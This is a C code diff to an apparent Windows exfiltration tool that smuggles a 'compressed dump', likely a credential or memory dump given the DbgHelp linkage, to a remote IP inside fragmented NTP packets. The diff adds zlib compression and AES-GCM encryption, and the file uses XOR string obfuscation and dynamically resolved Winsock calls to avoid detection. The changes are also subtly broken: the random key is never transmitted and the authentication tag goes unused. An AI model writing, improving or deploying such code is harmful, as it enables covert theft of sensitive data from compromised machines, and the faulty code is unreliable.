@@ -7,9 +7,19 @@
 #include <zlib.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
+#include <openssl/aes.h>
+#include <openssl/rand.h>
+#include <openssl/evp.h>
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "DbgHelp.lib")
+
+#define NTP_PACKET_SIZE 48
+#define PAYLOAD_SIZE 8
+#define AES_KEY_SIZE 32
+#define AES_IV_SIZE 12
+#define AES_TAG_SIZE 16
+#define COMPRESSED_BUFFER_SIZE 1024
 
 // --- Fonction de déobfuscation ---
 // Décodage d'une chaîne obfusquée (chaque caractère XOR avec la clé)
@@ -167,6 +177,7 @@ int SendNTPPacket(const char *target_ip, int target_port, const unsigned char pa
     HMODULE hWs2_32 = GetModuleHandleW(L"ws2_32.dll");
     if (!hWs2_32)
         return -1;
+
     typedef int (WSAAPI *pWSAStartup)(WORD, LPWSADATA);
     typedef SOCKET (WSAAPI *pSocket)(int, int, int);
     typedef int (WSAAPI *pSendTo)(SOCKET, const char*, int, int, const struct sockaddr*, int);
@@ -209,28 +220,51 @@ int SendNTPPacket(const char *target_ip, int target_port, const unsigned char pa
 // --- Envoi du dump compressé sous forme de paquets NTP fragmentés ---
 // Le premier paquet est un header de 8 octets (4 octets : nombre total de paquets, 4 octets : taille totale)
 // Chaque paquet de données contient 8 octets : 4 octets de numéro de séquence et 4 octets de fragment de données.
-int SendCompressedDumpAsNTP(const char *target_ip, int target_port, const char *compressedData, size_t compressedSize) {
-    const int fragment_size = 4;
-    int total_fragments = (int)((compressedSize + fragment_size - 1) / fragment_size);
+int SendCompressedDumpAsNTP(const char *target_ip, int target_port, const char *data, size_t data_size) {
+    unsigned char key[AES_KEY_SIZE], iv[AES_IV_SIZE], tag[AES_TAG_SIZE];
+    unsigned char compressed_data[COMPRESSED_BUFFER_SIZE];
+    unsigned long compressed_size = COMPRESSED_BUFFER_SIZE;
 
-    // Prépare le paquet header
+    // Compress data
+    if (compress(compressed_data, &compressed_size, (const unsigned char *)data, data_size) != Z_OK) {
+        printf("[!] Compression failed.\n");
+        return -1;
+    }
+
+    // Encrypt data using AES-GCM
+    RAND_bytes(key, AES_KEY_SIZE);
+    RAND_bytes(iv, AES_IV_SIZE);
+    unsigned char encrypted_data[compressed_size];
+
+    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
+    int len;
+    EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, key, iv);
+    EVP_EncryptUpdate(ctx, encrypted_data, &len, compressed_data, compressed_size);
+    EVP_EncryptFinal_ex(ctx, encrypted_data + len, &len);
+    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, AES_TAG_SIZE, tag);
+    EVP_CIPHER_CTX_free(ctx);
+
+    int fragment_size = 4;
+    int total_fragments = (compressed_size + fragment_size - 1) / fragment_size;
+
+    // Prepare header packet
     unsigned char header[8];
     header[0] = (total_fragments >> 24) & 0xFF;
     header[1] = (total_fragments >> 16) & 0xFF;
     header[2] = (total_fragments >> 8) & 0xFF;
     header[3] = total_fragments & 0xFF;
-    header[4] = ((unsigned int)compressedSize >> 24) & 0xFF;
-    header[5] = ((unsigned int)compressedSize >> 16) & 0xFF;
-    header[6] = ((unsigned int)compressedSize >> 8) & 0xFF;
-    header[7] = ((unsigned int)compressedSize) & 0xFF;
+    header[4] = ((unsigned int)compressed_size >> 24) & 0xFF;
+    header[5] = ((unsigned int)compressed_size >> 16) & 0xFF;
+    header[6] = ((unsigned int)compressed_size >> 8) & 0xFF;
+    header[7] = ((unsigned int)compressed_size) & 0xFF;
 
     if (SendNTPPacket(target_ip, target_port, header) == SOCKET_ERROR) {
         printf("[!] Failed to send header packet.\n");
         return -1;
     }
-    printf("[+] Header sent: %d fragments, %zu bytes total.\n", total_fragments, compressedSize);
+    printf("[+] Header sent: %d fragments, %zu bytes total.\n", total_fragments, compressed_size);
 
-    // Envoi des paquets de données
+    // Send data packets
     for (int seq = 0; seq < total_fragments; seq++) {
         unsigned char payload[8];
         payload[0] = (seq >> 24) & 0xFF;
@@ -238,11 +272,11 @@ int SendCompressedDumpAsNTP(const char *target_ip, int target_port, const char *
         payload[2] = (seq >> 8) & 0xFF;
         payload[3] = seq & 0xFF;
         int offset = seq * fragment_size;
-        int remaining = (int)compressedSize - offset;
-        int copySize = remaining < fragment_size ? remaining : fragment_size;
+        int remaining = compressed_size - offset;
+        int copySize = (remaining < fragment_size) ? remaining : fragment_size;
         memset(payload + 4, 0, 4);
         if (copySize > 0)
-            memcpy(payload + 4, compressedData + offset, copySize);
+            memcpy(payload + 4, encrypted_data + offset, copySize);
         if (SendNTPPacket(target_ip, target_port, payload) == SOCKET_ERROR) {
             printf("[!] Failed to send packet %d.\n", seq + 1);
             return -1;
